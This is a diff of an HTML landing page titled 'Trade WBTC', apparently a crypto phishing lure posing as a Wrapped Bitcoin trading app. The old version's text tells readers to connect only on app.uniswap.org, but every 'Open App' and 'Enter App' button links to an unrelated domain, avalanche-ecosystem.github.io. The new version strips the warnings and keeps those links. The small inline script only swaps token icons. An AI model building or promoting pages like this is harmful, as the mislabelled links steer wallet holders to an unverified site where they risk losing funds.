@@ -1,47 +1,120 @@
 <!doctype html>
-<html lang="en"><head>
-<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>Trade WBTC - Open App</title><meta name="description" content="trade wbtc on Ethereum via the Uniswap app; verify the WBTC contract, review route details, and connect only on app.uniswap.org.">
-<meta name="robots" content="index,follow,max-image-preview:large">
-<link rel="canonical" href="https://trade-wbtc.github.io/"><meta name="theme-color" content="#FFFFFF">
-<meta property="og:type" content="website"><meta property="og:title" content="Trade WBTC - Open App"><meta property="og:description" content="trade wbtc on Ethereum via the Uniswap app; verify the WBTC contract, review route details, and connect only on app.uniswap.org.">
-<meta property="og:url" content="https://trade-wbtc.github.io/"><meta property="og:image" content="https://trade-wbtc.github.io/og-cover.png"><meta property="og:locale" content="en">
-<meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="Trade WBTC - Open App"><meta name="twitter:description" content="trade wbtc on Ethereum via the Uniswap app; verify the WBTC contract, review route details, and connect only on app.uniswap.org."><meta name="twitter:image" content="https://trade-wbtc.github.io/og-cover.png">
-<link rel="icon" href="favicon.png" type="image/png"><link rel="manifest" href="site.webmanifest"><link rel="apple-touch-icon" href="static/icon-180.png">
-<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600;700&display=swap">
-<link rel="stylesheet" href="static/style.css">
-<script type="application/ld+json">{"@context": "https://schema.org", "@graph": [{"@type": "WebSite", "@id": "https://trade-wbtc.github.io/#website", "url": "https://trade-wbtc.github.io/", "name": "WBTC"}, {"@type": "WebPage", "@id": "https://trade-wbtc.github.io/#webpage", "url": "https://trade-wbtc.github.io/", "name": "Trade WBTC - Open App", "description": "trade wbtc on Ethereum via the Uniswap app; verify the WBTC contract, review route details, and connect only on app.uniswap.org.", "inLanguage": "en", "isPartOf": {"@id": "https://trade-wbtc.github.io/#website"}}, {"@type": "Organization", "@id": "https://trade-wbtc.github.io/#org", "name": "WBTC", "url": "https://trade-wbtc.github.io/", "logo": "https://trade-wbtc.github.io/og-cover.png", "sameAs": ["https://x.com/WrappedBTC", "https://github.com/WrappedBTC", "https://www.coingecko.com/en/coins/wrapped-bitcoin", "https://coinmarketcap.com/currencies/wrapped-bitcoin/"]}, {"@type": "WebApplication", "@id": "https://trade-wbtc.github.io/#app", "name": "Trade WBTC", "url": "https://trade-wbtc.github.io/", "applicationCategory": "FinanceApplication", "operatingSystem": "Web", "browserRequirements": "Requires JavaScript", "description": "trade wbtc on Ethereum via the Uniswap app; verify the WBTC contract, review route details, and connect only on app.uniswap.org.", "featureList": ["Ethereum ERC-20", "8 decimals", "Verified contract"], "isPartOf": {"@id": "https://trade-wbtc.github.io/#website"}}, {"@type": "FAQPage", "@id": "https://trade-wbtc.github.io/#faq", "inLanguage": "en", "mainEntity": [{"@type": "Question", "name": "What is WBTC?", "acceptedAnswer": {"@type": "Answer", "text": "WBTC is Wrapped Bitcoin, an ERC-20 token on Ethereum designed to represent Bitcoin value for Ethereum wallets and DeFi applications. It lets users trade, lend, borrow, or provide liquidity with BTC-denominated exposure without leaving Ethereum."}}, {"@type": "Question", "name": "What is the official WBTC contract?", "acceptedAnswer": {"@type": "Answer", "text": "On Ethereum mainnet, the WBTC contract is 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599. Verify this address on Etherscan or a trusted token index before approving trades, because token names and symbols can be copied."}}, {"@type": "Question", "name": "Is WBTC the same as Bitcoin?", "acceptedAnswer": {"@type": "Answer", "text": "No. BTC is native to the Bitcoin network, while WBTC is an ERC-20 token on Ethereum that represents BTC exposure through a wrapped-token system. WBTC is useful in DeFi, but it carries wrapper, contract, liquidity, and Ethereum wallet risks."}}, {"@type": "Question", "name": "Can I send WBTC to a Bitcoin address?", "acceptedAnswer": {"@type": "Answer", "text": "No. Ethereum WBTC must be sent to an Ethereum-compatible address, not a native Bitcoin address. Sending WBTC to the wrong network or address type can cause loss of funds. Use proper redemption or exchange withdrawal routes for native BTC."}}, {"@type": "Question", "name": "Why does WBTC have 8 decimals?", "acceptedAnswer": {"@type": "Answer", "text": "WBTC uses 8 decimals, matching Bitcoin's decimal convention. This matters for wallets, routers, smart contracts, and trade-size displays. Always check the human-readable amount and the contract address before approving a WBTC transaction."}}, {"@type": "Question", "name": "Where can I trade WBTC?", "acceptedAnswer": {"@type": "Answer", "text": "WBTC trades on Ethereum DEXs such as Uniswap and on many centralized exchanges. The better venue depends on custody preference, liquidity, fees, gas, trade size, and whether the user wants to stay in Ethereum DeFi or convert to native BTC or fiat."}}]}]}</script>
-</head><body>
-<header class="site-header">
-  <a class="brand" href="#top" aria-label="WBTC"><img class="brand-mark" src="favicon.png" alt="" width="34" height="34"><span class="brand-name">WBTC</span></a>
-  <nav class="site-nav" aria-label="Primary"><ul class="nav-list"><li><a href="#about">About</a></li><li><a href="#facts">Overview</a></li><li><a href="#faq">FAQ</a></li></ul></nav>
-  <span class="header-spacer"></span>
-  <a class="btn btn-dark header-cta" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App ↗</a>
-  <button class="nav-toggle" aria-label="Menu" aria-expanded="false"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M4 7h16M4 12h16M4 17h16"/></svg></button>
-</header>
-<main id="top">
-  <section class="hero">
-    <div class="hero-deco" aria-hidden="true"><span class="strip"></span><span class="d1"></span><span class="d2"></span><span class="d3"></span><span class="d4"></span><span class="d5"></span></div>
-    <div class="container">
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Trade WBTC</title>
+  <meta name="description" content="Trade WBTC lets you exchange Wrapped Bitcoin for other cryptocurrencies in a few quick steps.">
+  <link rel="canonical" href="https://trade-wbtc.github.io/">
+  <meta name="robots" content="index,follow,max-image-preview:large">
+  <meta name="theme-color" content="#F7F4EF">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Trade WBTC">
+  <meta property="og:description" content="Trade WBTC lets you exchange Wrapped Bitcoin for other cryptocurrencies in a few quick steps.">
+  <meta property="og:url" content="https://trade-wbtc.github.io/">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Trade WBTC">
+  <meta name="twitter:description" content="Trade WBTC lets you exchange Wrapped Bitcoin for other cryptocurrencies in a few quick steps.">
+  <link rel="icon" type="image/png" href="favicon.png">
+  <link rel="apple-touch-icon" href="favicon.png">
+  <link rel="manifest" href="site.webmanifest">
+  <link rel="stylesheet" href="style.css">
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@graph": [
+      {
+        "@type": "WebSite",
+        "@id": "https://trade-wbtc.github.io/#website",
+        "url": "https://trade-wbtc.github.io/",
+        "name": "Trade WBTC",
+        "inLanguage": "en"
+      },
+      {
+        "@type": "WebApplication",
+        "@id": "https://trade-wbtc.github.io/#app",
+        "name": "Trade WBTC",
+        "applicationCategory": "FinanceApplication",
+        "operatingSystem": "Web",
+        "url": "https://trade-wbtc.github.io/"
+      },
+      {
+        "@type": "Organization",
+        "@id": "https://trade-wbtc.github.io/#organization",
+        "name": "Trade WBTC",
+        "url": "https://trade-wbtc.github.io/",
+        "logo": "https://trade-wbtc.github.io/favicon.png"
+      }
+    ]
+  }
+  </script>
+</head>
+<body>
+  <header class="topbar">
+    <a class="brand" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer" aria-label="Trade WBTC home">
+      <img src="simpleswap.png" width="30" height="30" alt="">
+      <span>Trade WBTC</span>
+    </a>
+
+    <nav class="nav" aria-label="Authority references">
+      <a href="https://bitcoin.org/en/" target="_blank" rel="nofollow noopener noreferrer">Bitcoin</a>
+      <a href="https://ethereum.org/" target="_blank" rel="nofollow noopener noreferrer">Ethereum</a>
+      <a href="https://www.coingecko.com/" target="_blank" rel="nofollow noopener noreferrer">Market data</a>
+    </nav>
+
+    <span class="spacer" aria-hidden="true"></span>
+    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
+  </header>
+
+  <main class="stage">
+    <section class="hero" aria-label="Trade WBTC">
       <h1>Trade WBTC</h1>
-      <div class="bridge-widget" role="group" aria-label="WBTC preview"><div class="bw-field"><span class="bw-coin"><img src="static/eth.png" alt="ETH" width="36" height="36"></span><span class="bw-meta"><span class="bw-amount">0</span><span class="bw-sub"><b>ETH</b> · Ethereum</span></span></div><button class="bw-switch" type="button" aria-label="Switch"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 9h13M17 9l-4-4M17 9l-4 4M20 15H7M7 15l4-4M7 15l4 4"/></svg></button><div class="bw-field"><span class="bw-coin"><img src="static/wbtc.png" alt="WBTC" width="36" height="36"></span><span class="bw-meta"><span class="bw-amount">0.0</span><span class="bw-sub"><b>WBTC</b> · Ethereum</span></span></div><a class="btn btn-dark bw-go" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App ↗</a></div>
-      <div class="hero-go"><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open WBTC ↗</a></div>
-      <p class="hero-note">Live preview — open the official WBTC app from your own wallet.</p>
-      <div class="trust-row"><span class="trust-chip">Ethereum ERC-20</span><span class="trust-chip">8 decimals</span><span class="trust-chip">Verified contract</span></div>
-    </div>
-  </section>
-  <section class="section" id="about"><div class="container"><h2>What is Trade WBTC?</h2><div class="capsule"><strong>WBTC</strong> is the <a class="inline-link" href="https://ethereum.org/en/developers/docs/standards/tokens/erc-20/" rel="noopener noreferrer">Wrapped Bitcoin ERC-20 token on Ethereum</a>, designed as a Bitcoin-backed representation for wallets, DEXs, and DeFi apps; see the <a href="https://www.wbtc.network/assets/wrapped-tokens-whitepaper.pdf">wrapped tokens whitepaper</a>.</div></div></section>
-  <section class="section" id="facts"><div class="container"><h2>Trade WBTC at a glance</h2><div class="facts"><div class="f"><small>Category</small><b><a class="inline-link" href="https://www.coingecko.com/en/coins/wrapped-bitcoin" rel="noopener noreferrer">Wrapped Bitcoin token</a></b></div><div class="f"><small>Network</small><b>Ethereum</b></div><div class="f"><small>Token</small><b>WBTC</b></div><div class="f"><small>Contract</small><b><a class="inline-link" href="https://etherscan.io/token/0x2260fac5e5542a773aa44fbcfedf7c193bc2c599" rel="noopener noreferrer">0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599</a></b></div><div class="f"><small>Decimals</small><b>8</b></div></div></div></section>
-  <section class="section section-alt"><div class="container"><h2>Trade WBTC on Ethereum</h2><div class="intent-a">Trading WBTC on Ethereum means trading an ERC-20 token designed to represent Bitcoin exposure inside Ethereum DeFi. The canonical WBTC token contract is 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599, and it uses 8 decimals like Bitcoin. A DEX trade can use ETH, WETH, USDC, or another supported ERC-20 as input, depending on liquidity and route. This is not the same as buying native BTC on the <a class="inline-link" href="https://bitcoin.org/en/how-it-works" rel="noopener noreferrer">Bitcoin network</a>. WBTC is useful when the user wants BTC-denominated exposure for <a class="inline-link" href="https://www.coingecko.com/learn/what-is-wrapped-bitcoin-wbtc-and-how-does-it-work" rel="noopener noreferrer">DeFi collateral</a>, lending, liquidity, or swaps, but it adds Ethereum smart-contract, token, bridge/custody, and liquidity considerations.</div></div></section><section class="section"><div class="container"><h2>Trade WBTC liquidity fees and price impact</h2><div class="intent-a">WBTC is widely traded, but execution quality still depends on venue, trade size, route, and liquidity. On a DEX such as <a class="inline-link" href="https://docs.uniswap.org/concepts/protocol/overview" rel="noopener noreferrer">Uniswap</a>, a WBTC trade can include Ethereum gas, pool fees, price impact, and <a class="inline-link" href="https://www.investopedia.com/terms/s/slippage.asp" rel="noopener noreferrer">slippage</a>. On a centralized exchange, costs can include trading fees, spreads, and withdrawal fees. Large WBTC trades deserve extra attention because small percentage differences can represent meaningful dollar amounts. Users should compare quoted output, minimum received, route, and market depth rather than assuming that every WBTC market tracks BTC perfectly. CoinGecko and Etherscan are useful for token identity, but the live trading venue determines execution.</div></div></section><section class="section section-alt"><div class="container"><h2>Trade WBTC contract address and decimals</h2><div class="intent-a">The WBTC Ethereum contract is 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599, and the token uses 8 decimals. Both details matter when trading, integrating, or reviewing wallet approvals. A fake token can reuse the WBTC name or symbol, but it cannot share the same <a class="inline-link" href="https://etherscan.io/token/0x2260fac5e5542a773aa44fbcfedf7c193bc2c599" rel="noopener noreferrer">Ethereum contract address</a>. Decimals also affect how amounts appear in wallets, routers, and portfolio tools. Before approving a WBTC trade, check the contract on Etherscan, confirm the selected network is <a class="inline-link" href="https://ethereum.org/en/developers/docs/" rel="noopener noreferrer">Ethereum mainnet</a>, and verify that the amount shown in the wallet prompt matches the intended trade size. This is especially important for high-value BTC-denominated assets.</div></div></section><section class="section"><div class="container"><h2>Trade WBTC on Uniswap or centralized exchange</h2><div class="intent-a">Trading WBTC on Uniswap keeps execution in a <a class="inline-link" href="https://academy.binance.com/en/glossary/self-custody" rel="noopener noreferrer">self-custody</a> Ethereum wallet, while a centralized exchange trade happens inside an exchange account until withdrawal. Uniswap can be useful when the output asset stays in DeFi, for example WBTC into WETH, USDC, or lending collateral. A centralized exchange may be better when the user wants <a class="inline-link" href="https://www.investopedia.com/terms/f/fiatmoney.asp" rel="noopener noreferrer">fiat rails</a>, order-book liquidity, or native BTC withdrawal. The right route depends on custody preference, trade size, gas, spread, fees, and whether the destination is Ethereum DeFi or the Bitcoin network. Always verify WBTC contract identity before on-chain approval and avoid sending WBTC to a native BTC address.</div></div></section>
-  <section class="section"><div class="container"><h2>How to trade Trade WBTC</h2><ol class="steps"><li><b>Open the app</b><span>Use the primary button to open app.uniswap.org and confirm the domain before connecting a wallet.</span></li><li><b>Confirm the token</b><span>Select Ethereum mainnet and verify WBTC contract 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599.</span></li><li><b>Review the quote</b><span>Check the input asset, route, <a class="inline-link" href="https://docs.uniswap.org/concepts/protocol/slippage" rel="noopener noreferrer">price impact</a>, slippage setting, and estimated network cost.</span></li><li><b>Sign in wallet</b><span>Approve only if needed, then confirm the swap from your wallet after the app details match your intent.</span></li></ol><div class="cta-band"><div><p>Ready to trade?</p><p class="sub">Open the official WBTC app and verify the domain before you sign.</p></div><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open WBTC ↗</a></div></div></section>
-  <section class="section"><div class="container"><h2>WBTC vs BTC for traders</h2><div class="cmp-wrap"><table class="cmp-table"><thead><tr><th>Dimension</th><th>WBTC</th><th>BTC</th></tr></thead><tbody><tr><td>Network</td><td>Ethereum ERC-20 token</td><td><a class="inline-link" href="https://bitcoin.org/en/how-it-works" rel="noopener noreferrer">Bitcoin native asset</a></td></tr><tr><td>Decimals</td><td>8</td><td>8</td></tr><tr><td>Main use</td><td>Ethereum DeFi trading, lending, collateral, liquidity</td><td>Bitcoin custody, transfers, and native BTC markets</td></tr><tr><td>Risk</td><td>Wrapper, contract, liquidity, and Ethereum wallet risk</td><td>Bitcoin custody, exchange, and network fee risk</td></tr></tbody></table></div></div></section>
-  <section class="section section-alt" id="faq"><div class="container"><h2>Trade WBTC FAQ</h2><div class="faq-list"><details open><summary><h3>What is WBTC?</h3></summary><div>WBTC is <a class="inline-link" href="https://coinmarketcap.com/currencies/wrapped-bitcoin/" rel="noopener noreferrer">Wrapped Bitcoin</a>, an ERC-20 token on Ethereum designed to represent Bitcoin value for Ethereum wallets and DeFi applications. It lets users trade, lend, borrow, or provide liquidity with BTC-denominated exposure without leaving Ethereum.</div></details><details><summary><h3>What is the official WBTC contract?</h3></summary><div>On Ethereum mainnet, the WBTC contract is 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599. Verify this address on Etherscan or a trusted token index before approving trades, because token names and symbols can be copied.</div></details><details><summary><h3>Is WBTC the same as Bitcoin?</h3></summary><div>No. BTC is native to the Bitcoin network, while WBTC is an ERC-20 token on Ethereum that represents BTC exposure through a <a class="inline-link" href="https://www.wbtc.network/assets/wrapped-tokens-whitepaper.pdf" rel="noopener noreferrer">wrapped-token system</a>. WBTC is useful in DeFi, but it carries wrapper, contract, liquidity, and Ethereum wallet risks.</div></details><details><summary><h3>Can I send WBTC to a Bitcoin address?</h3></summary><div>No. Ethereum WBTC must be sent to an Ethereum-compatible address, not a native Bitcoin address. Sending WBTC to the wrong network or address type can cause loss of funds. Use proper redemption or exchange withdrawal routes for native BTC.</div></details><details><summary><h3>Why does WBTC have 8 decimals?</h3></summary><div>WBTC uses 8 decimals, matching Bitcoin's decimal convention. This matters for wallets, routers, smart contracts, and trade-size displays. Always check the human-readable amount and the contract address before approving a WBTC transaction.</div></details><details><summary><h3>Where can I trade WBTC?</h3></summary><div>WBTC trades on Ethereum DEXs such as Uniswap and on many centralized exchanges. The better venue depends on custody preference, liquidity, fees, gas, trade size, and whether the user wants to stay in Ethereum DeFi or convert to native BTC or fiat.</div></details></div></div></section>
-</main>
-<footer class="site-footer"><div class="container">
-  <div class="footer-grid"></div>
-  <p class="footer-note">Not the official WBTC or Uniswap app; verify app.uniswap.org before connecting; educational content only, not financial advice.</p>
-  <p class="footer-meta"><a href="#top">Back to top ↑</a></p>
-</div></footer>
-<script src="static/app.js" defer></script>
-</body></html>
+      <p class="value"><strong>Trade WBTC</strong> lets you exchange Wrapped Bitcoin for other cryptocurrencies in a few quick steps.</p>
+    </section>
+
+    <section class="app-card" aria-label="Exchange route">
+      <div class="route">
+        <div class="leg">
+          <span class="label">From</span>
+          <span class="chip">
+            <img src="eth.png" width="28" height="28" alt="ETH">
+            <span>ETH</span>
+          </span>
+        </div>
+
+        <button class="switch" type="button" data-switch aria-label="Switch exchange direction">
+          <span aria-hidden="true">&#8594;</span>
+        </button>
+
+        <div class="leg">
+          <span class="label">To</span>
+          <span class="chip">
+            <img src="btc.png" width="28" height="28" alt="WBTC">
+            <span>WBTC</span>
+          </span>
+        </div>
+      </div>
+
+      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App <span aria-hidden="true">&#8250;</span></a>
+    </section>
+  </main>
+
+  <footer class="footer">Trade WBTC &mdash; 2026</footer>
+
+  <script>
+  (function () {
+    "use strict";
+    var button = document.querySelector("[data-switch]");
+    if (!button) return;
+
+    button.addEventListener("click", function () {
+      var chips = document.querySelectorAll(".chip");
+      if (chips.length < 2) return;
+      var first = chips[0].innerHTML;
+      chips[0].innerHTML = chips[1].innerHTML;
+      chips[1].innerHTML = first;
+    });
+  }());
+  </script>
+</body>
+</html>
